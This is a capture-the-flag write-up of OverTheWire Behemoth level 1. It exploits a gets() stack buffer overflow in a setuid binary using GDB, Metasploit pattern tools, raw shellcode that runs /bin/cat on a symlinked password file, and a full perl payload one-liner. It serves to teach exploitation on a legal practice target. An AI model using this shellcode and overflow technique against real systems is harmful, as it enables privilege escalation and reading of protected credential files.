---
layout: post
title: OverTheWire - Behemoth 1
---

Site: http://overthewire.org/wargames/behemoth/ <br>
Level: 1 <br>
Situation: Simple Buffer Overflow <br><br>

Note: The stack is affected by varying things including the environment.

The memory addresses in GDB will differ from what you see without. Now to correct this we will use a small script called invoker.sh which will help standardize our environments.

{% highlight bash %}
#!/bin/sh

while getopts "dte:h?" opt ; do
  case "$opt" in
    h|\?)
      printf "usage: %s -e KEY=VALUE prog [args...]\n" $(basename $0)
      exit 0
      ;;
    t)
      tty=1
      gdb=1
      ;;
    d)
      gdb=1
      ;;
    e)
      env=$OPTARG
      ;;
  esac
done

shift $(expr $OPTIND - 1)
prog=$(readlink -f $1)
shift
if [ -n "$gdb" ] ; then
  if [ -n "$tty" ]; then
    touch /tmp/gdb-debug-pty
    exec env - $env TERM=screen PWD=$PWD gdb -tty /tmp/gdb-debug-pty --args 
$prog "$@"
  else
    exec env - $env TERM=screen PWD=$PWD gdb --args $prog "$@"
  fi
else
  exec env - $env TERM=screen PWD=$PWD $prog "$@"
fi

{% endhighlight %}

Please note in GDB we still will have to unset the following two environmental variables inside GDB.

{% highlight bash %}
unset env LINES
unset env COLUMNS
{% endhighlight %}

We will also be utilizing a small c program to help us determine the size of our shellcode.

{% highlight c %}

// Shellcalc.c

#include <stdio.h>

char shellcode[] ="shellcodehere";

int main(int argc, char *argv[])
{
       	fprintf(stdout,"Length: %d\n",strlen(shellcode));
}

{% endhighlight %}

For our sake let us make a folder in our temp directory and move our invoker.sh and small c program.

{% highlight bash %}
behemoth1@melinda:~$ ls
behemoth1@melinda:~$ mkdir /tmp/behe1
behemoth1@melinda:~$ cd /tmp/behe1
behemoth1@melinda:/tmp/behe1$ 
{% endhighlight %}

We will do the usual, identify the file type and build, also run it to see what it does.

{% highlight bash %}
behemoth1@melinda:/tmp/behe1$ file /behemoth/behemoth1
/behemoth/behemoth1: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=6b301db8057be8df8ceead844e81f05764289f92, not stripped
behemoth1@melinda:/tmp/behe1$ ./invoker.sh /behemoth/behemoth1
Password: d
Authentication failure.
Sorry.
{% endhighlight %}

Open in GDB see if there are any interesting calls.

{% highlight bash %}
behemoth1@melinda:/tmp/behe1$ ./invoker.sh -d /behemoth/behemoth1
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804845d <+0>:	push   ebp
   0x0804845e <+1>:	mov    ebp,esp
   0x08048460 <+3>:	and    esp,0xfffffff0
   0x08048463 <+6>:	sub    esp,0x60
   0x08048466 <+9>:	mov    DWORD PTR [esp],0x8048530
   0x0804846d <+16>:	call   0x8048310 <printf@plt>
   0x08048472 <+21>:	lea    eax,[esp+0x1d]
   0x08048476 <+25>:	mov    DWORD PTR [esp],eax
   0x08048479 <+28>:	call   0x8048320 <gets@plt>
   0x0804847e <+33>:	mov    DWORD PTR [esp],0x804853c
   0x08048485 <+40>:	call   0x8048330 <puts@plt>
   0x0804848a <+45>:	mov    eax,0x0
   0x0804848f <+50>:	leave  
   0x08048490 <+51>:	ret    
End of assembler dump.

{% endhighlight %}

No easy strcmp, the printf would be interesting if it was displaying input we supplied, could test for a string format vulnerability. There is a "gets" however. Gets grabs user input and stores it into a buffer array. Since its storing input we dictate. We can attempt to overflow the buffer that it stores the input into.

{% highlight bash %}
(gdb) run
Starting program: /games/behemoth/behemoth1 
Password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Authentication failure.
Sorry.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
{% endhighlight %}

Alright so looks like we are successfully overflowing the buffer. If we notice we get two signs saying it did. First one is the segfault the second is the address that is segfaulted on 0x41414141. A in hex is 41, so 4 byte address = AAAA = 0x41414141.<br>
Now we need to find out exactly how big of a buffer we need in order to cause a crash. We could guess and randomly insert values but instead we will utilize metasploit's pattern_create.rb tool and the pattern_offset.rb.

{% highlight bash %}
vagabond :: /opt/metasploit-framework » ./tools/pattern_create.rb 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
{% endhighlight %}

{% highlight bash %}
(gdb) run
Starting program: /games/behemoth/behemoth1 
Password: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Authentication failure.
Sorry.

Program received signal SIGSEGV, Segmentation fault.
0x63413663 in ?? ()

{% endhighlight %}

{% highlight bash %}
vagabond :: /opt/metasploit-framework » ./tools/pattern_offset.rb 0x63413663
[*] Exact match at offset 79
{% endhighlight %}


So what we want to do is setup our shellcode inside the 79 byte buffer. This is a lot to work with. At the end of the 79 buffer we can add the new return address in the 4 bytes that follow.

Now before we can create the payload we must first find the start of our stack. This can easily be achieved utilizing the debugger and either "A" or nopsleds. For this example we will use "BBBBAAAA" combination. Using GDB we can locate BBBB in the stack which equates to 0x42424242. We break on the final puts before it says sorry.


{% highlight bash %}
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804845d <+0>:	push   %ebp
   0x0804845e <+1>:	mov    %esp,%ebp
   0x08048460 <+3>:	and    $0xfffffff0,%esp
   0x08048463 <+6>:	sub    $0x60,%esp
   0x08048466 <+9>:	movl   $0x8048530,(%esp)
   0x0804846d <+16>:	call   0x8048310 <printf@plt>
   0x08048472 <+21>:	lea    0x1d(%esp),%eax
   0x08048476 <+25>:	mov    %eax,(%esp)
   0x08048479 <+28>:	call   0x8048320 <gets@plt>
   0x0804847e <+33>:	movl   $0x804853c,(%esp)
   0x08048485 <+40>:	call   0x8048330 <puts@plt>
   0x0804848a <+45>:	mov    $0x0,%eax
   0x0804848f <+50>:	leave  
   0x08048490 <+51>:	ret    
End of assembler dump.
(gdb) break *0x08048485
Breakpoint 1 at 0x8048485
(gdb) run
Starting program: /games/behemoth/behemoth1 
Password: BBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Breakpoint 1, 0x08048632 in main ()
(gdb) find $esp, $esp+500, 0x42424242
0xffffdded
1 pattern found.
(gdb) 

{% endhighlight %}
0xffffdded is the start of our address so we can begin to form our payload. Our payload is going to be structured as follows.

NOP<>SHELLCODE+NOP<>STACKADDRESS

Note: The shellcode used in this example is from another example that cats a file rather then spawns a shell. File is located in /tmp/b2p.

{% highlight bash %}
behemoth1@melinda:/tmp/behe1$ ln -s /etc/behemoth_pass/behemoth2 /tmp/b2p
{% endhighlight %}

Now we need the shellcode and to know the size of it so we utilize our shellcalc application. 

{% highlight bash %}
\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x62\x32\x70\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80
{% endhighlight %}

The size of this is 40 bytes. So now we just need to pad the front and back to make our payload. To make it easy on us we will output this to a file called input.txt. That way the bash shell can't affect the values.

Note: We put the address in backwards as we are on a little endian machine.

{% highlight bash %}
perl -e 'print "\x90"x4 . "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2f\x62\x32\x70\x68\x2f\x74\x6d\x70\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80" . "\x90"x35 . "\xed\xdd\xff\xff"'> input.txt
{% endhighlight %}

Now that we have the proper input.txt we can verify that it works in GDB.

{% highlight bash %}
(gdb) run < input.txt
Starting program: /games/behemoth/behemoth1 < input.txt
Password: Authentication failure.
Sorry.
process 11828 is executing new program: /bin/cat
/bin/cat: /tmp/b2p: Permission denied
[Inferior 1 (process 11828) exited with code 01]
(gdb) quit
{% endhighlight %}

Perfect we see that /bin/cat was called on /tmp/b2p but we don't have permission to read it. This is normal behavior under debuggers and is a countermeasure to help insure that people don't just modify any application that has escalated privileges. To get it to work we have to do it in user space.

{% highlight bash %}
behemoth1@melinda:/tmp/behe1$ ./invoker.sh /behemoth/behemoth1 < input.txt
Password: Authentication failure.
Sorry.
[OMITTED]
{% endhighlight %}

Thats it we have found the password.